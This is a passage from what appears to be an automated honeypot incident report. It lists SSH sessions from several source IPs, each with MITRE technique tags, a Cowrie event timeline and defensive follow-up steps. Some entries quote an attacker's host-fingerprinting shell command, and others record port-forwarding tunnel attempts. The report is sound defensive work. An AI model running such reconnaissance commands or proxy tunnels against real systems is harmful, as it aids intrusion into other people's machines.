- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e902109aa65

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 14:35 |
| **Last Seen** | 2026-08-29 14:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:35:25` | `cowrie.session.connect` |
| `2026-08-29 14:35:25` | `cowrie.client.version` |
| `2026-08-29 14:35:25` | `cowrie.client.kex` |
| `2026-08-29 14:35:27` | `cowrie.login.success` |
| `2026-08-29 14:35:29` | `cowrie.session.params` |
| `2026-08-29 14:35:29` | `cowrie.command.input` |
| `2026-08-29 14:35:29` | `cowrie.command.input` |
| `2026-08-29 14:35:29` | `cowrie.command.input` |
| `2026-08-29 14:35:29` | `cowrie.command.input` |
| `2026-08-29 14:35:29` | `cowrie.command.input` |
| `2026-08-29 14:35:29` | `cowrie.command.success` |
| `2026-08-29 14:35:29` | `cowrie.command.input` |
| `2026-08-29 14:35:29` | `cowrie.command.input` |
| `2026-08-29 14:35:29` | `cowrie.command.input` |
| `2026-08-29 14:35:29` | `cowrie.command.input` |
| `2026-08-29 14:35:30` | `cowrie.log.closed` |
| `2026-08-29 14:35:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12443b7143f3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 14:37 |
| **Last Seen** | 2026-08-29 14:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:37:27` | `cowrie.session.connect` |
| `2026-08-29 14:37:27` | `cowrie.client.version` |
| `2026-08-29 14:37:27` | `cowrie.client.kex` |
| `2026-08-29 14:37:30` | `cowrie.login.success` |
| `2026-08-29 14:37:31` | `cowrie.session.params` |
| `2026-08-29 14:37:31` | `cowrie.command.input` |
| `2026-08-29 14:37:31` | `cowrie.command.input` |
| `2026-08-29 14:37:31` | `cowrie.command.input` |
| `2026-08-29 14:37:31` | `cowrie.command.input` |
| `2026-08-29 14:37:31` | `cowrie.command.input` |
| `2026-08-29 14:37:31` | `cowrie.command.success` |
| `2026-08-29 14:37:31` | `cowrie.command.input` |
| `2026-08-29 14:37:31` | `cowrie.command.input` |
| `2026-08-29 14:37:31` | `cowrie.command.input` |
| `2026-08-29 14:37:31` | `cowrie.command.input` |
| `2026-08-29 14:37:32` | `cowrie.log.closed` |
| `2026-08-29 14:37:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98a5030a2d93

| Field | Detail |
|---|---|
| **Source IP** | `190.223.36[.]108` |
| **First Seen** | 2026-08-29 14:37 |
| **Last Seen** | 2026-08-29 14:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:37:37` | `cowrie.session.connect` |
| `2026-08-29 14:37:37` | `cowrie.client.version` |
| `2026-08-29 14:37:37` | `cowrie.client.kex` |
| `2026-08-29 14:37:39` | `cowrie.login.success` |
| `2026-08-29 14:37:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.36[.]108` to AbuseIPDB if not already reported
- [ ] Block `190.223.36[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcfd3c53af6e

| Field | Detail |
|---|---|
| **Source IP** | `43.224.227[.]156` |
| **First Seen** | 2026-08-29 14:37 |
| **Last Seen** | 2026-08-29 14:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:37:45` | `cowrie.session.connect` |
| `2026-08-29 14:37:46` | `cowrie.client.version` |
| `2026-08-29 14:37:46` | `cowrie.client.kex` |
| `2026-08-29 14:37:48` | `cowrie.login.success` |
| `2026-08-29 14:37:49` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:37:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.224.227[.]156` to AbuseIPDB if not already reported
- [ ] Block `43.224.227[.]156` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-101eec73ccf3

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-08-29 14:37 |
| **Last Seen** | 2026-08-29 14:37 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:37:49` | `cowrie.session.connect` |
| `2026-08-29 14:37:50` | `cowrie.client.version` |
| `2026-08-29 14:37:50` | `cowrie.client.kex` |
| `2026-08-29 14:37:53` | `cowrie.login.success` |
| `2026-08-29 14:37:54` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:37:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12bbcc13f8b7

| Field | Detail |
|---|---|
| **Source IP** | `89.253.90[.]113` |
| **First Seen** | 2026-08-29 14:37 |
| **Last Seen** | 2026-08-29 14:38 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:37:59` | `cowrie.session.connect` |
| `2026-08-29 14:37:59` | `cowrie.client.version` |
| `2026-08-29 14:37:59` | `cowrie.client.kex` |
| `2026-08-29 14:38:01` | `cowrie.login.success` |
| `2026-08-29 14:38:01` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:38:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.253.90[.]113` to AbuseIPDB if not already reported
- [ ] Block `89.253.90[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd115ae0cf00

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:38 |
| **Last Seen** | 2026-08-29 14:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:38:26` | `cowrie.session.connect` |
| `2026-08-29 14:38:26` | `cowrie.client.version` |
| `2026-08-29 14:38:26` | `cowrie.client.kex` |
| `2026-08-29 14:38:29` | `cowrie.login.success` |
| `2026-08-29 14:38:29` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:38:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:38:31` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ce0fa9c1992

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 14:39 |
| **Last Seen** | 2026-08-29 14:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:39:34` | `cowrie.session.connect` |
| `2026-08-29 14:39:34` | `cowrie.client.version` |
| `2026-08-29 14:39:34` | `cowrie.client.kex` |
| `2026-08-29 14:39:36` | `cowrie.login.success` |
| `2026-08-29 14:39:37` | `cowrie.session.params` |
| `2026-08-29 14:39:37` | `cowrie.command.input` |
| `2026-08-29 14:39:37` | `cowrie.command.input` |
| `2026-08-29 14:39:37` | `cowrie.command.input` |
| `2026-08-29 14:39:37` | `cowrie.command.input` |
| `2026-08-29 14:39:37` | `cowrie.command.input` |
| `2026-08-29 14:39:37` | `cowrie.command.success` |
| `2026-08-29 14:39:37` | `cowrie.command.input` |
| `2026-08-29 14:39:37` | `cowrie.command.input` |
| `2026-08-29 14:39:37` | `cowrie.command.input` |
| `2026-08-29 14:39:37` | `cowrie.command.input` |
| `2026-08-29 14:39:38` | `cowrie.log.closed` |
| `2026-08-29 14:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed38b4bdc02b

| Field | Detail |
|---|---|
| **Source IP** | `172.90.128[.]97` |
| **First Seen** | 2026-08-29 14:39 |
| **Last Seen** | 2026-08-29 14:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:39:39` | `cowrie.session.connect` |
| `2026-08-29 14:39:39` | `cowrie.client.version` |
| `2026-08-29 14:39:39` | `cowrie.client.kex` |
| `2026-08-29 14:39:40` | `cowrie.login.success` |
| `2026-08-29 14:39:40` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.90.128[.]97` to AbuseIPDB if not already reported
- [ ] Block `172.90.128[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9edf1b037b91

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-08-29 14:39 |
| **Last Seen** | 2026-08-29 14:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:39:46` | `cowrie.session.connect` |
| `2026-08-29 14:39:47` | `cowrie.client.version` |
| `2026-08-29 14:39:47` | `cowrie.client.kex` |
| `2026-08-29 14:39:49` | `cowrie.login.success` |
| `2026-08-29 14:39:50` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:39:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f14666af106e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 14:41 |
| **Last Seen** | 2026-08-29 14:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:41:46` | `cowrie.session.connect` |
| `2026-08-29 14:41:47` | `cowrie.client.version` |
| `2026-08-29 14:41:47` | `cowrie.client.kex` |
| `2026-08-29 14:41:48` | `cowrie.login.success` |
| `2026-08-29 14:41:49` | `cowrie.session.params` |
| `2026-08-29 14:41:49` | `cowrie.command.input` |
| `2026-08-29 14:41:49` | `cowrie.command.input` |
| `2026-08-29 14:41:49` | `cowrie.command.input` |
| `2026-08-29 14:41:49` | `cowrie.command.input` |
| `2026-08-29 14:41:49` | `cowrie.command.input` |
| `2026-08-29 14:41:49` | `cowrie.command.success` |
| `2026-08-29 14:41:49` | `cowrie.command.input` |
| `2026-08-29 14:41:49` | `cowrie.command.input` |
| `2026-08-29 14:41:49` | `cowrie.command.input` |
| `2026-08-29 14:41:49` | `cowrie.command.input` |
| `2026-08-29 14:41:50` | `cowrie.log.closed` |
| `2026-08-29 14:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce0382b3e9a2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 14:43 |
| **Last Seen** | 2026-08-29 14:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:43:58` | `cowrie.session.connect` |
| `2026-08-29 14:43:58` | `cowrie.client.version` |
| `2026-08-29 14:43:58` | `cowrie.client.kex` |
| `2026-08-29 14:44:00` | `cowrie.login.success` |
| `2026-08-29 14:44:01` | `cowrie.session.params` |
| `2026-08-29 14:44:01` | `cowrie.command.input` |
| `2026-08-29 14:44:01` | `cowrie.command.input` |
| `2026-08-29 14:44:01` | `cowrie.command.input` |
| `2026-08-29 14:44:01` | `cowrie.command.input` |
| `2026-08-29 14:44:01` | `cowrie.command.input` |
| `2026-08-29 14:44:01` | `cowrie.command.success` |
| `2026-08-29 14:44:01` | `cowrie.command.input` |
| `2026-08-29 14:44:01` | `cowrie.command.input` |
| `2026-08-29 14:44:01` | `cowrie.command.input` |
| `2026-08-29 14:44:01` | `cowrie.command.input` |
| `2026-08-29 14:44:02` | `cowrie.log.closed` |
| `2026-08-29 14:44:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad9971f4086

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:44 |
| **Last Seen** | 2026-08-29 14:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:44:56` | `cowrie.session.connect` |
| `2026-08-29 14:44:56` | `cowrie.client.version` |
| `2026-08-29 14:44:56` | `cowrie.client.kex` |
| `2026-08-29 14:44:57` | `cowrie.login.success` |
| `2026-08-29 14:44:57` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:44:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:44:58` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:44:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b3993ee2474

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 14:46 |
| **Last Seen** | 2026-08-29 14:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:46:04` | `cowrie.session.connect` |
| `2026-08-29 14:46:04` | `cowrie.client.version` |
| `2026-08-29 14:46:04` | `cowrie.client.kex` |
| `2026-08-29 14:46:06` | `cowrie.login.success` |
| `2026-08-29 14:46:07` | `cowrie.session.params` |
| `2026-08-29 14:46:07` | `cowrie.command.input` |
| `2026-08-29 14:46:07` | `cowrie.command.input` |
| `2026-08-29 14:46:07` | `cowrie.command.input` |
| `2026-08-29 14:46:07` | `cowrie.command.input` |
| `2026-08-29 14:46:07` | `cowrie.command.input` |
| `2026-08-29 14:46:07` | `cowrie.command.success` |
| `2026-08-29 14:46:07` | `cowrie.command.input` |
| `2026-08-29 14:46:07` | `cowrie.command.input` |
| `2026-08-29 14:46:07` | `cowrie.command.input` |
| `2026-08-29 14:46:07` | `cowrie.command.input` |
| `2026-08-29 14:46:08` | `cowrie.log.closed` |
| `2026-08-29 14:46:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-630fd86444e3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-29 14:48 |
| **Last Seen** | 2026-08-29 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:48:03` | `cowrie.session.connect` |
| `2026-08-29 14:48:03` | `cowrie.client.version` |
| `2026-08-29 14:48:03` | `cowrie.client.kex` |
| `2026-08-29 14:48:04` | `cowrie.login.success` |
| `2026-08-29 14:48:04` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:48:05` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-29 14:48:05` | `cowrie.direct-tcpip.data` |
| `2026-08-29 14:48:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-074cf05302e8

| Field | Detail |
|---|---|
| **Source IP** | `177.174.16[.]55` |
| **First Seen** | 2026-08-29 14:48 |
| **Last Seen** | 2026-08-29 14:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:48:14` | `cowrie.session.connect` |
| `2026-08-29 14:48:15` | `cowrie.client.version` |
| `2026-08-29 14:48:15` | `cowrie.client.kex` |
| `2026-08-29 14:48:17` | `cowrie.login.success` |
| `2026-08-29 14:48:17` | `cowrie.direct-tcpip.request` |
| `2026-08-29 14:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.16[.]55` to AbuseIPDB if not already reported
- [ ] Block `177.174.16[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e023d1df3258

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-08-29 14:50 |
| **Last Seen** | 2026-08-29 14:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-29 14:50:04` | `cowrie.session.connect` |
| `2026-08-29 14:50:04` | `cowrie.client.version` |
| `2026-08-29 14:50:04` | `cowrie.client.kex` |
| `2026-08-29 14:50:06` | `cowrie.login.success` |
| `2026-08-29 14:50:07` | `cowrie.session.params` |
| `2026-08-29 14:50:07` | `cowrie.command.input` |
| `2026-08-29 14:50:07` | `cowrie.command.input` |
| `2026-08-29 14:50:07` | `cowrie.command.input` |
| `2026-08-29 14:50:07` | `cowrie.command.input` |
| `2026-08-29 14:50:07` | `cowrie.command.input` |
| `2026-08-29 14:50:07` | `cowrie.command.success` |
| `2026-08-29 14:50:07` | `cowrie.command.input` |
| `2026-08-29 14:50:07` | `cowrie.command.input` |
| `2026-08-29 14:50:07` | `cowrie.command.input` |
| `2026-08-29 14:50:07` | `cowrie.command.input` |
| `2026-08-29 14:50:08` | `cowrie.log.closed` |
| `2026-08-29 14:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
